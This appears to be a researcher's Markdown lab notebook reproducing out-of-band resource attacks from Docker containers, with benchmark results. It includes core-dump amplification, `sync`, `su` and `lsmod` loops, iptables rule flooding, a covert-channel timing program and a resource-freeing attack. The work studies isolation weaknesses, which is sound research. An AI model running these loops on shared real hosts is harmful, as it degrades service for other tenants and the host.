[toc]

# 0

The test is on VMWare virtual machine Ubuntu20. The virtual machine has 2 CPUs, with 4GB memory in total.

Docker container systems are Ubuntu16 



## setup cgroup

```bash
#cpu controller quota and period, for 20%
sudo echo 200000 > /sys/fs/cgroup/cpu/docker/cpu.cfs_period_us
sudo echo 40000 > /sys/fs/cgroup/cpu/docker/cpu.cfs_quota_us

#pid controller 50
sudo echo 50 > /sys/fs/cgroup/pids/docker/pids.max
```



# case1

```bash
docker run -d -it --cpuset-cpus=0 --cpus=0.2 --memory=1g --pids-limit=50 --privileged --name ubuntu16_1 ubuntu:16.04 
```



## install and setup Apport

```bash
sudo apt install apport
sudo nano /etc/default/apport

# set this to 0 to disable apport, or to 1 to enable it 
enabled=1

sudo service apport restart
```

## a div0 program for exception (core dump)

```c++
#include <stdio.h>

int main(){
	int a,b;
	a=3;
	b=0;
	int c;
	c=a/b;
	
	printf("%d\n",c);
	
	return 0;
}
```

## workloads amplification

container CPU:

![image-20230207000358948](D:\git\houdini_cases\figs\image-20230207000358948.png)

host CPU: 

![image-20230207000452798](D:\git\houdini_cases\figs\image-20230207000452798.png)



## DoS

```bash
sysbench --test=cpu run
sysbench --test=memory run
sysbench --test=fileio --file-test-mode=rndwr run
sysbench --test=fileio --file-test-mode=rndrd run
```

result:

| servers                  | CPU    | memory | I/O read | I/O write |
| ------------------------ | ------ | ------ | -------- | --------- |
| baseline                 | 111.32 | 343.87 | 438.56   | 23.435    |
| exceptions same core     | 103.45 | 318.32 | 74.844   | 12.591    |
| exception different core | 110.23 | 338.96 | 119.22   | 14.062    |

There there is no significant difference of CPU and memory on my personal laptop virtual machine....... 

# case 2 

`sync` loop:

```sh
while true; do
	sync
done
```



## I/O-based DoS attack

| test                                            | baseline | attack | ratio |
| ----------------------------------------------- | -------- | ------ | ----- |
| seq\_read (iops)                                | 2549     | 471    | 0.18  |
| seq\_write (iops)                               | 998      | 735    | 0.73  |
| rand\_read(iops)                                | 416      | 46     | 0.11  |
| rand\_write (iops)                              | 415      | 41     | 0.10  |
| shellscript (index) (1 concurrent)              | 95.4     | 85.4   | 0.90  |
| excel throughput (index)                        | 21.6     | 25.9?? |       |
| file copy (index) (4096 bufsize 8000 maxblocks) | 235      | 181.1  | 0.77  |
| process creation (index)                        | 50.1     | 57.1?? |       |

```bash
fio --filename=tmpfs --direct=1 --rw=read --bs=4k --size=512M --numjobs=1 --runtime=60 --name=job1
fio --filename=tmpfs --direct=1 --rw=write --bs=4k --size=512M --numjobs=1  --name=job2
fio --filename=tmpfs --direct=1 --rw=randrw --bs=4k --size=512M --numjobs=1 --runtime=60 --name=job3
```

**WARNING: DO NOT WRITE TO YOUR HARDDISK DIRECTLY (/dev/sdaX)**

The version of UnixBenchmark I use is: https://github.com/kdlucas/byte-unixbench.git 



## convert channels

code to write files and get time results:

```c++
#include <cstdio>
#include <chrono>

using namespace std;
using namespace chrono;

int main(){
	
	FILE *csv=fopen("result.csv","w");
	
	for (int i=1;i<=100;i++){
		uint64_t ms1 = duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
		for (int j=0;j<10;j++){
			FILE *temp_file=fopen("tempfile.txt","w");
			for(long l=0;l<1024*1024;l++){
				fputc(0xff,temp_file);
			}
			fclose(temp_file);
		}
		uint64_t ms2 = duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
		fprintf(csv,"%ld\n",ms2-ms1);
	}
	
	return 0;
}
// --std=c++11 
```

![image-20230207040230036](D:\git\houdini_cases\figs\image-20230207040230036.png)



## resource-freeing attack (RFA)

code to read webpage:

```c
#include <stdio.h>

int main(){
	FILE *webpage=fopen("/root/byte-unixbench/UnixBench/results/140532a18475-2023-02-07-02.html","r");
	FILE *outpage=fopen("outpage.html","a");
	
	char ch;
	while(1){
		while((ch=fgetc(webpage))!=EOF){
			fprintf(outpage,"%c",ch);
		}
		fclose(webpage);
		webpage=fopen("/root/byte-unixbench/UnixBench/results/140532a18475-2023-02-07-02.html","r");
	}
}
```



|                  | CPU    | memory |
| ---------------- | ------ | ------ |
| no competition   | 110.74 | 428.24 |
| running together | 48.13  | 143.41 |
| RFA              | 89.59  | 239.67 |





# case 3

start journald service:

```bash
sudo systemctl start systemd-journald
```

Then, use `su`  command in a loop at malicious container.

| test                                            | baseline | attack   | ratio |
| ----------------------------------------------- | -------- | -------- | ----- |
| seq\_read (iops)                                | 2549     | 694      | 0.27  |
| seq\_write (iops)                               | 998      | 672      | 0.67  |
| rand\_read(iops)                                | 416      | 149      | 0.35  |
| rand\_write (iops)                              | 415      | 155      | 0.36  |
| shellscript (index) (1 concurrent)              | 95.4     | 161.6 ?? |       |
| excel throughput (index)                        | 21.6     | 39.9 ??  |       |
| file copy (index) (4096 bufsize 8000 maxblocks) | 235      | 308.6 ?? |       |
| process creation (index)                        | 50.1     | 72.2 ??  |       |



# case 4

The tty device I am using is the terminal provided by portainer.io (https://www.portainer.io/).

Use `lsmod` to show all the loaded modules of the container:

```bash
while true; 
	do lsmod;  
	clear; 
done
```

|           | CPU utilization |
| --------- | --------------- |
| container | 18.52           |
| dockerd   | 4.6             |
| docker    | 1.3             |
|           |                 |
|           |                 |

When I am running this `lsmod` loop, I can hear the sound that my laptop is burning.

# case 5

to check the iptables of docker by using 

```bash
sudo iptables -L
```

there are four chains of DOCKER (DOCKER, DOCKER-ISOLATION-STAGE1/2, DOCKER-USER).

Here I try to add 10,000 rules to DOCKER-USER chain:

```sh
for i in {1..10000}; 
	do iptables -A DOCKER-USER -j ACCEPT; 
done

iptables-save
```

Then, I use `iperf` to test the network and simulate the network transmission. 

The docker container is using `iperf` to send packets to the address on the Internet, so the transmission will be through the NIC.

The CUP usage of `ksoftirqd` is 1.3% when highest. The bandwidth is 1.04 Mbits/sec.